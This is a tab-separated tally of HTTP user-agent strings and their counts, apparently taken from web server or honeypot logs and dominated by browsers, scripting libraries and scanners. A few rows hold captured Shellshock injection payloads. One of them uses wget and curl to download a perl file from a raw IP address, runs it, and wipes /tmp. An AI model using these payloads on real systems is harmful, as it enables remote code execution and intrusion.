useragent	agent_count
Mozilla/5.0 Jorgee	67505
Mozilla/5.0	8821
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0	6654
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)	5686
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0	5537
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36	4694
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36	4404
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)	4217
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0	4072
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0	4048
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36	3940
Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0	3875
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36	3801
Python-urllib/2.7	3766
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0	3752
Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0	3657
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)	3630
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)	3539
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)	3522
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36	3498
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0	3425
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0	3384
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)	3377
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36	3376
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36	3127
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0	3063
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0	3007
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0	2965
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0	2804
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0	2690
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0)	2677
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36	2633
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0	2595
Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0	2543
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0	2533
Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0	2527
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36	2424
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0	2338
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36	2279
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36	2255
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)	2093
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)	2091
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0	1941
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36	1503
ZmEu	1394
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36	1293
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/45.0	1230
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/31.0	1086
Mozilla/5.0 (Windows NT 10.0; Win64; x64)	899
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0	880
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0	697
test	387
Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1	384
Mozilla/5.0 eegroJ	369
Mozilla/5.0 muhstik-scan	327
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0	321
Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)	295
Wget(linux)	292
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0	184
Go-http-client/1.1	170
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)	163
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36	158
curl/7.29.0	147
python-requests/2.18.4	142
Python-urllib/2.6	125
Mozilla/5.0 zgrab/0.x	123
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36	122
Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0	120
python-requests/2.19.1	117
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)	109
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)	82
Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)	79
python-requests/2.20.0	75
python-requests/2.20.1	55
python-requests/2.21.0	51
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25	48
jexboss	48
fasthttp	47
Auto Spider 1.0	46
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0; ; NCLIENT50_AAP726C7CDD1A1) Gecko/20100101 Firefox/52.0	44
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36	44
Mozilla	40
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36	40
ApiTool	39
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36	39
curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2	38
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.1.3.el7.x86_64	37
curl/7.15.5 (x86_64-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5	35
python-requests/2.22.0	33
HttpClient	31
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1 Eagle             Special v12 -> 1.1	31
"() { :;};echo; /bin/bash -c "" echo 2014 | md5sum"""	28
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36	28
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36	28
curl/7.35.0	28
python-requests/2.12.4	28
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36	27
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)	24
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36	24
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)	24
curl/7.47.0	24
jbosses	24
libwww-perl/6.33	23
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36	22
Mozilla/3.0 (compatible; Indy Library)	21
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32	21
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0	21
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)	21
python-requests/2.9.1	21
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0	20
Polycom	20
curl/7.15.5 (i686-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5	20
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.14.4.el7.x86_64	20
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0	18
User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705	18
www.probethenet.com scanner	18
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36	17
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36	17
Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5	17
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)	16
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2526.73 Safari/537.36	16
libwww-perl/6.26	16
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0	15
Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8	15
Mozilla/7.0 (compatible; MSIE 8.0; Windows Seven)	15
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36	14
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)	13
Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0	13
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36	13
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko	13
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)	13
libwww-perl/6.31	13
the beast	13
"() { :;};/usr/bin/perl -e 'print ""Content-Type: text/plain\r\n\r\nXSUCCESS!"";system(""wget http://36.97.143.96/ka.c -O /tmp/ka.c;curl -O /tmp/ka.c http://36.97.143.96/ka.c;perl /tmp/ka.c ; rm -rf ka.* ; rm -rf /tmp/* ;rm -f /tmp/* "");'"	12
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36 Scanning for research (researchscan.comsys.rwth-aachen.de)	12
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0	12
curl/7.19.7 (i386-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2	12
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36	11
Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/17.0 Firefox/17.0	11
Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9) Gecko/2008052906 Firefox/3.0	11
kubectl/v1.12.0 (linux/amd64) kubernetes/0ed3388	11
Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]	10
libwww-perl/6.36	10
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0	9
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)	9
Java/1.8.0_161	8
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6	8
Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15	8
libwww-perl/5.833	8
Java/1.8.0_131	7
Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)	7
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27	7
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36	7
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0	7
Mozilla/5.0 Gecko/20100101	7
Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.9.168 Version/11.51	7
libwww-perl/6.05	7
okhttp/3.5.0	7
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1062.4.3.el7.x86_64	7
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b1) Gecko/20081007 Firefox/3.0	6
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8	6
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36	6
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36	6
Python-urllib/3.5	6
Safari/12603.2.4 CFNetwork/811.5.4 Darwin/16.6.0 (x86_64)	6
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0	5
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36	5
Mozilla/5.0 (compatible; Zollard; Linux)	5
curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.13.1.0 zlib/1.2.3 libidn/1.18 libssh2/1.2.2	5
python-requests/2.14.2	5
Morfeus Fucking Scanner	4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36	4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36	4
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36	4
Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Thunderbird/38.1.0 Lightning/4.0.2	4
Python-urllib/3.4	4
curl/7.19.7 (x86_64-koji-linux-gnu) libcurl/7.19.7 NSS/3.15.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2	4
curl/7.21.0 (i486-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6	4
curl/7.53.1	4
libwww-perl/6.15	4
python-requests/2.12.3	4
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; Maxthon 2.0)	3
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)	3
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50	3
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko	3
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36	3
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36	3
Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0	3
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch; MASPJS research see port 80 on my ip)	3
Mozilla/5.0 Project 25499 (project25499.com)	3
NYU	3
PycURL/7.19.5 libcurl/7.38.0 GnuTLS/3.3.8 zlib/1.2.8 libidn/1.29 libssh2/1.4.3 librtmp/2.3	3
WinHTTP/1.1	3
curl/7.55.1	3
libwww-perl/6.13	3
libwww-perl/6.27	3
python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-754.24.3.el6.x86_64	3
Cloud mapping experiment. Contact research@pdrlabs.net	2
Java/1.8.0_144	2
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)	2
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)	2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0	2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2701.62 Safari/537.36	2
Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136	2
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36	2
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0	2
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36	2
Mozilla/5.0 (Windows NT 5.1; Trident/7.0; rv:11.0) like Gecko	2
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36	2
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36	2
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0	2
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0	2
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36	2
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36	2
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36	2
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36	2
Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2727.68 Safari/537.36	2
Mozilla/5.0 Windows	2
Mozilla/5.0 [en] (X11, U; OpenVAS-VT 9.0.3)	2
Wget/1.19.4 (linux-gnu)	2
core-project/1.0	2
curl/7.40.0	2
curl/7.58.0	2
libwww-perl/6.24	2
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.2.2.el7.x86_64	2
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.9.1.el7.x86_64	2
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.10.1.el7.x86_64	2
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.12.2.el7.x86_64	2
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.5.1.el7.x86_64	2
() { uniscan; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id	1
DataCha0s/2.0	1
Googlebot-Video/1.0	1
Hello, world	1
LWP::Simple/6.00 libwww-perl/6.08	1
Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12	1
Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d	1
Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)	1
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)	1
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; ; NCLIENT50_AAP726C7CDD1A1)	1
Mozilla/5.0 (Linux; Android 7.0; LG-H820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36	1
Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; MI 2S Build/JRO03L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30	1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0	1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0	1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7	1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7	1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36	1
Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba	1
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64	1
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.1.114 Yowser/2.5 Safari/537.36	1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393	1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063	1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3436.0 Safari/537.36	1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.72	1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36	1
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0	1
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36	1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174	1
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36	1
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:12.2) Gecko/20120606 Firefox/12.2-x64 PaleMoon/12.2-x64	1
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36	1
Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))	1
Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1	1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.107	1
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0	1
Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)	1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)	1
Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1	1
Mozilla/7.0 (Windows NT 7.0; WOW64; rv:7.0) Gecko/15103 Firefox/46.0	1
New Horizons	1
Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11	1
PolycomSoundPointIP-SPIP_335-UA/4.0.2.11307	1
PycURL/7.19.5 libcurl/7.38.0 GnuTLS/3.3.30 zlib/1.2.8 libidn/1.29 libssh2/1.4.3 librtmp/2.3	1
UCWEB/8.8 (iPhone; CPU OS_6; en-US)AppleWebKit/534.1 U3/3.0.0 Mobile	1
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36	1
Wget/1.14 (linux-gnu)	1
Wget/1.17.1	1
curl/7.15.5 (i386-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5	1
libwww-perl/6.08	1
libwww-perl/6.25	1
libwww-perl/6.29	1
libwww-perl/6.34	1
libwww-perl/6.35	1
muhstik-scan/1.0	1
okhttp/3.8.0	1
python-requests/0.12.1	1
python-requests/2.10.0	1
python-requests/2.19.0	1
python-requests/2.4.3 CPython/3.4.2 Linux/3.16.0-4-amd64	1
python-requests/2.6.0 CPython/2.7.5 Linux/2.6.32-042stab139.1	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1062.1.2.el7.x86_64	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.17.1.el7.x86_64	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.11.6.el7.x86_64	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-862.3.2.el7.x86_64	1
python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.27.2.el7.x86_64	1
python-requests/2.7.0 CPython/2.7.0 Windows/2003Server	1
python-requests/2.7.0 CPython/2.7.13rc1 Windows/2003Server	1
python-requests/2.7.0 CPython/2.7.9 Windows/2003Server	1
	0
